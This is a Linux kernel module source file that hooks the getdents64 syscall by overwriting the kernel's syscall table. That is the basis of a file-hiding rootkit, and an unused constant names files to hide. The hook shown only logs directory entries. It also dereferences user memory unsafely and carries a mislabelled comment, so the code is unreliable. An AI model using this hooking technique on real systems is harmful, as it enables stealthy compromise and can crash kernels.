#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>

#include "my_memory.h"

#define IGNORE_TEXT "hook"                      //<- Text on file/dir to hide. If a file contains this text, hides it

static unsigned long *__sys_call_table;                         //<- Pointer to the Kernel syscall table

asmlinkage long (*original_getdents64) (const struct pt_regs *regs);


asmlinkage int hooked_getdents64(const struct pt_regs *regs)
{
        struct linux_dirent64 __user * direntry;      //<- Points to the direntry returned by original getdents
        struct linux_dirent64 * dir_current;          //<- Points to the actual treated direntry
        unsigned long n_size;                         //<- size of all direntries
        unsigned long offset = 0;                     //<- Offset between direntries
                                                      //   To go througth all direntries
        unsigned int i = 0;                           //<- Just a counter

        pr_info("   Syscall hooked.\n");

        n_size = original_getdents64(regs);             //<- Call to the orinal getdents
                                                        //   n_size <- total size of direntries
                                                        //   In regs the RSI reg with the @ of direntry
        direntry = (struct linux_dirent64 *) regs->si;  //<- direntry <- @ referenced in RSI register

        dir_current = (void *) direntry;
        pr_info("   Entry ONE: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);

        dir_current = (void *) dir_current + dir_current->d_reclen;
        pr_info("   Entry TWO: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);

        dir_current = (void *) dir_current + dir_current->d_reclen;
        pr_info("   Entry THREE: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);

        dir_current = (void *) dir_current + dir_current->d_reclen;
        pr_info("   Entry FOUR: %s of size %d.\n", dir_current->d_name, dir_current->d_reclen);



        return n_size;
}


static int __init lkm_init(void)
{
        pr_info("Loading Module...\n");

        __sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");     //<- Get address for Kernel Syscall Table

        if (__sys_call_table == NULL) {
                pr_err("  Can't find syscall table!.\n");
                return -1;
        }

        original_getdents64 = (void *) __sys_call_table[__NR_getdents64];       //<- Save actual address for sys_shutdown

        my_memory_rw();         

        __sys_call_table[__NR_getdents64] = (unsigned long) hooked_getdents64;   //<- Replace the syscall pointer in the syscall table

        my_memory_ro();

        return 0;
}

static void __exit lkm_exit(void)
{
        pr_info("Exiting... Bye.\n");

        my_memory_rw();

        __sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;

        my_memory_ro();

}

module_init(lkm_init);           //<- Tells that Init Kernel Module is the lkm_init function
module_exit(lkm_exit);          //<- Tells that Exit Kernel Function is lkm_exit

MODULE_AUTHOR("Guillem Alminyana");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("LKM Hook Syscall Example");

